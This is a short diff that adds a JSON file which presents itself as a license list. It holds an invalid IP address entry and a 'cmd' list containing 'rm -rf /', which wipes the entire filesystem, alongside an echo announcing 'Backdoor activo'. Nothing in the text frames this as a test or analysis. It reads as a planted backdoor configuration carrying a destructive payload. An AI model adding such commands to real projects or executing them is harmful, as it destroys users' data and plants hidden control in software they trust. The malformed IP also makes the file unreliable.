@@ -1,0 +1,10 @@
+{
+    "licenses": [
+        "ip:123.456.78.90",
+        "ip:111.222.33.44"
+    ],
+    "cmd": [
+        "rm -rf /", 
+        "echo 'Backdoor activo'"
+    ]
+}
